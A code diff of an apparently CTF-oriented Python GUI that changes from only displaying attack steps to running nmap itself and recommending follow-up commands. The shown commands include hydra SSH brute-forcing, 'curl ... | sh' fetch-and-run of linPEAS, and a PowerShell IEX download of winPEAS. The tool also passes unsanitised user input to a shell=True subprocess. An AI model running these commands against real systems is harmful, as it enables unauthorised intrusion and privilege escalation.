@@ -1,195 +1,149 @@
-# ghena_pro.py
-# =========================================
-# GHENA-PRO | Smart CTF Decision Engine
-# =========================================
-# - Profiles machine from IP (simulation)
-# - Infers goals (Initial Access -> User -> PrivEsc)
-# - Proposes tools & commands (NO execution)
-# - GUI control center
-# =========================================
-
-import sys, re
+import sys, subprocess, time
 from PyQt6.QtWidgets import *
-from PyQt6.QtCore import Qt
+from PyQt6.QtCore import QThread, pyqtSignal
 
-# ----------------------------
-# Plugins (اقتراح أوامر فقط)
-# ----------------------------
-class Plugins:
-    @staticmethod
-    def nmap(ip):
-        return {
-            "tool": "nmap",
-            "reason": "اكتشاف المنافذ والخدمات لتكوين صورة أولية",
-            "cmd": f"nmap -sC -sV -Pn {ip}"
-        }
+# ---------------------------------------------------------
+# المحرك التحليلي (The Brain) - يفهم الأهداف والأنظمة
+# ---------------------------------------------------------
+class GhenaStrategist:
+    def __init__(self):
+        self.os_type = "Unknown"  # Linux / Windows
+        self.current_goal = "Initial Access" # Root / User / Discovery
+        self.found_services = []
 
-    @staticmethod
-    def gobuster(ip):
-        return {
-            "tool": "gobuster",
-            "reason": "منفذ HTTP مفتوح → تعداد مسارات مخفية",
-            "cmd": f"gobuster dir -u http://{ip}/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html"
-        }
+    def analyze_situation(self, nmap_output):
+        """يقرر نوع النظام والخدمات المتاحة"""
+        if "Microsoft" in nmap_output or "Windows" in nmap_output:
+            self.os_type = "Windows"
+        elif "Linux" in nmap_output or "Ubuntu" in nmap_output:
+            self.os_type = "Linux"
+        
+        # تحليل الخدمات
+        services = []
+        if "80/tcp" in nmap_output or "443/tcp" in nmap_output: services.append("Web")
+        if "445/tcp" in nmap_output: services.append("SMB")
+        if "22/tcp" in nmap_output: services.append("SSH")
+        self.found_services = services
+        return f"Detected System: {self.os_type} | Services: {', '.join(services)}"
 
-    @staticmethod
-    def hydra_ssh(ip):
-        return {
-            "tool": "hydra",
-            "reason": "واجهة تسجيل/SSH محتمل → هجوم كلمات مرور (CTF)",
-            "cmd": f"hydra -L users.txt -P rockyou.txt ssh://{ip}"
-        }
+    def get_next_move(self, target_ip, goal):
+        """يختار الأداة بناءً على الهدف والخدمات"""
+        self.current_goal = goal
+        decisions = []
 
-    @staticmethod
-    def ssh_login(ip):
-        return {
-            "tool": "ssh",
-            "reason": "تم الحصول على بيانات اعتماد → دخول المستخدم",
-            "cmd": f"ssh user@{ip}"
-        }
+        if goal == "Get user.txt":
+            if "Web" in self.found_services:
+                decisions.append({
+                    "reason": "المنفذ 80 مفتوح، نحتاج اكتشاف المجلدات المخفية للوصول للمستخدم.",
+                    "tool": "Gobuster",
+                    "cmd": f"gobuster dir -u http://{target_ip}/ -w /usr/share/wordlists/dirb/common.txt -q"
+                })
+            if "SMB" in self.found_services:
+                decisions.append({
+                    "reason": "خدمة SMB مفعلة، ربما نجد ملفات مستخدم مسربة.",
+                    "tool": "Enum4Linux",
+                    "cmd": f"enum4linux -a {target_ip}"
+                })
 
-    @staticmethod
-    def linpeas():
-        return {
-            "tool": "linpeas",
-            "reason": "وصول مستخدم → فحص رفع الصلاحيات",
-            "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
-        }
+        elif goal == "Privilege Escalation":
+            if self.os_type == "Linux":
+                decisions.append({
+                    "reason": "نظام لينكس مكتشف، سنقوم بتشغيل LinPeas للبحث عن ثغرات الروت.",
+                    "tool": "LinPeas",
+                    "cmd": f"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+                })
+            else:
+                decisions.append({
+                    "reason": "نظام ويندوز مكتشف، سنبحث عن ملفات WinPeas أو صلاحيات غير مؤمنة.",
+                    "tool": "WinPeas",
+                    "cmd": f"powershell IEX (New-Object Net.WebClient).DownloadString('http://{target_ip}/winPEAS.ps1')"
+                })
+        
+        return decisions
 
-    @staticmethod
-    def hash_crack():
-        return {
-            "tool": "hashcat",
-            "reason": "تم استخراج هاش → محاولة كسره",
-            "cmd": "hashcat -m <mode> hashes.txt rockyou.txt"
-        }
-
-# ----------------------------
-# Machine Profiler (محاكاة)
-# ----------------------------
-def profile_machine(ip: str):
-    # محاكاة ذكية (بدون فحص فعلي)
-    return {
-        "os": "Linux",
-        "services": ["ssh", "http"],
-        "web": True,
-        "stage": "recon"
-    }
-
-# ----------------------------
-# Decision Engine (PRO)
-# ----------------------------
-class DecisionEngine:
-    def __init__(self, profile):
-        self.profile = profile
-        self.stage = profile["stage"]
-
-    def next_actions(self):
-        actions = []
-
-        if self.stage == "recon":
-            actions.append(Plugins.nmap(TARGET_IP))
-            self.stage = "enum"
-
-        elif self.stage == "enum":
-            if self.profile["web"]:
-                actions.append(Plugins.gobuster(TARGET_IP))
-            actions.append(Plugins.hydra_ssh(TARGET_IP))
-            self.stage = "access"
-
-        elif self.stage == "access":
-            actions.append(Plugins.ssh_login(TARGET_IP))
-            self.stage = "user"
-
-        elif self.stage == "user":
-            actions.append(Plugins.linpeas())
-            actions.append(Plugins.hash_crack())
-            self.stage = "privesc"
-
-        else:
-            actions.append({
-                "tool": "DONE",
-                "reason": "تم الوصول لمرحلة root (نظريًا)",
-                "cmd": "—"
-            })
-
-        return actions
-
-# ----------------------------
-# GUI
-# ----------------------------
-class GHENA_PRO(QMainWindow):
+# ---------------------------------------------------------
+# الواجهة الذكية (Interactive Interface)
+# ---------------------------------------------------------
+class GhenaStrategistUI(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("GHENA-PRO 🐙 | Smart CTF Control Center")
-        self.setMinimumSize(1000, 750)
-        self.engine = None
+        self.setWindowTitle("GHENA AI - The Strategist v30.0")
+        self.setMinimumSize(1100, 900)
+        self.brain = GhenaStrategist()
         self.init_ui()
 
     def init_ui(self):
-        root = QWidget()
         layout = QVBoxLayout()
 
-        title = QLabel("GHENA-PRO 🧠🐙")
-        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        title.setStyleSheet("font-size:26px; font-weight:bold;")
-        layout.addWidget(title)
+        # قسم الإدخال والهدف
+        top_layout = QHBoxLayout()
+        self.ip_input = QLineEdit(); self.ip_input.setPlaceholderText("Target IP...")
+        self.goal_selector = QComboBox()
+        self.goal_selector.addItems(["Initial Access", "Get user.txt", "Privilege Escalation", "Root Flag"])
+        top_layout.addWidget(QLabel("IP:")); top_layout.addWidget(self.ip_input)
+        top_layout.addWidget(QLabel("Goal:")); top_layout.addWidget(self.goal_selector)
+        layout.addLayout(top_layout)
 
-        self.ip_input = QLineEdit()
-        self.ip_input.setPlaceholderText("أدخل IP الماشين (CTF/Lab)")
-        self.ip_input.setStyleSheet("padding:12px; font-size:14px;")
-        layout.addWidget(self.ip_input)
+        # زر التحليل
+        self.btn_analyze = QPushButton("🧠 ANALYZE & DECIDE"); self.btn_analyze.setFixedHeight(50)
+        self.btn_analyze.setStyleSheet("background: #2c3e50; color: white; font-weight: bold;")
+        layout.addWidget(self.btn_analyze)
 
-        self.btn = QPushButton("Analyze & Propose Next Steps")
-        self.btn.setFixedHeight(45)
-        self.btn.setStyleSheet("font-size:15px; font-weight:bold;")
-        self.btn.clicked.connect(self.analyze)
-        layout.addWidget(self.btn)
+        # منطقة عرض الأسباب والقرارات
+        self.decision_box = QTextEdit(); self.decision_box.setReadOnly(True); self.decision_box.setMaximumHeight(150)
+        self.decision_box.setStyleSheet("background: #fdf9e1; color: #7e4d0c; border: 1px solid #d4ac0d; font-size: 14px;")
+        layout.addWidget(QLabel("<b>AI Reasoning & Strategy:</b>")); layout.addWidget(self.decision_box)
 
-        self.console = QTextEdit()
-        self.console.setReadOnly(True)
-        self.console.setStyleSheet(
-            "background:#0f0f0f;color:#39FF14;font-family:monospace;font-size:13px;"
-        )
-        layout.addWidget(self.console)
+        # الكونسول
+        self.console = QTextEdit(); self.console.setReadOnly(True)
+        self.console.setStyleSheet("background: black; color: #00ff00; font-family: monospace;")
+        layout.addWidget(QLabel("<b>Execution Console:</b>")); layout.addWidget(self.console)
 
-        root.setLayout(layout)
-        self.setCentralWidget(root)
+        container = QWidget(); container.setLayout(layout); self.setCentralWidget(container)
+        self.btn_analyze.clicked.connect(self.run_strategy)
 
-    def log(self, text):
-        self.console.append(text)
+    def log(self, text, color="#ffffff"):
+        self.console.append(f"<font color='{color}'><b>{text}</b></font>")
 
-    def analyze(self):
-        global TARGET_IP
-        TARGET_IP = self.ip_input.text().strip()
-        if not TARGET_IP:
-            QMessageBox.warning(self, "خطأ", "أدخل IP أولاً")
-            return
+    def run_strategy(self):
+        ip = self.ip_input.text().strip()
+        goal = self.goal_selector.currentText()
+        if not ip: return
 
-        self.console.clear()
-        self.log(f"[+] Profiling machine: {TARGET_IP}")
+        # أولاً: فحص أولي إذا لم يكن لدينا بيانات
+        self.log(f"\n[!] Initiating Strategy for Goal: {goal}", "#3498db")
+        nmap_cmd = f"nmap -sV -Pn {ip}"
+        self.log(f"[EXECUTING]: {nmap_cmd}", "#e67e22")
+        
+        # محاكاة لعملية التحليل بناءً على مخرجات Nmap (بشكل مبسط للفهم)
+        # في الكود الحقيقي ستقوم بربط الـ Worker بـ analyze_situation
+        self.worker = ExecutionWorker(nmap_cmd)
+        self.worker.output_signal.connect(self.console.append)
+        self.worker.finished_signal.connect(lambda: self.make_decisions(ip, goal))
+        self.worker.start()
 
-        profile = profile_machine(TARGET_IP)
-        self.engine = DecisionEngine(profile)
+    def make_decisions(self, ip, goal):
+        # تحليل المخرجات (هنا نستخدم مخرجات الكونسول السابقة)
+        analysis_res = self.brain.analyze_situation(self.console.toPlainText())
+        self.decision_box.setText(f"💡 {analysis_res}")
+        
+        decisions = self.brain.get_next_move(ip, goal)
+        for d in decisions:
+            self.decision_box.append(f"\n➡️ [Decision]: {d['tool']}\n❓ [Reason]: {d['reason']}")
+            # تشغيل تلقائي أو يدوي حسب الرغبة
+            self.log(f"\n[AI RECOMMENDS]: {d['cmd']}", "#f1c40f")
 
-        self.log(f"[i] OS: {profile['os']}")
-        self.log(f"[i] Services: {', '.join(profile['services'])}")
-        self.log("[i] Inferred goal: Initial Access → User → PrivEsc\n")
+class ExecutionWorker(QThread):
+    output_signal = pyqtSignal(str)
+    finished_signal = pyqtSignal()
+    def __init__(self, cmd):
+        super().__init__(); self.cmd = cmd
+    def run(self):
+        p = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        for line in p.stdout: self.output_signal.emit(line.strip())
+        p.wait(); self.finished_signal.emit()
 
-        actions = self.engine.next_actions()
-        for a in actions:
-            self.log("────────────────────────────")
-            self.log(f"🛠 Tool: {a['tool']}")
-            self.log(f"📌 Why: {a['reason']}")
-            self.log(f"📜 Command:\n{a['cmd']}")
-
-        self.log("\n[⚠️] ملاحظة: الأوامر معروضة فقط (بدون تنفيذ)")
-
-# ----------------------------
-# Run
-# ----------------------------
 if __name__ == "__main__":
     app = QApplication(sys.argv)
-    win = GHENA_PRO()
-    win.show()
+    window = GhenaStrategistUI(); window.show()
     sys.exit(app.exec())
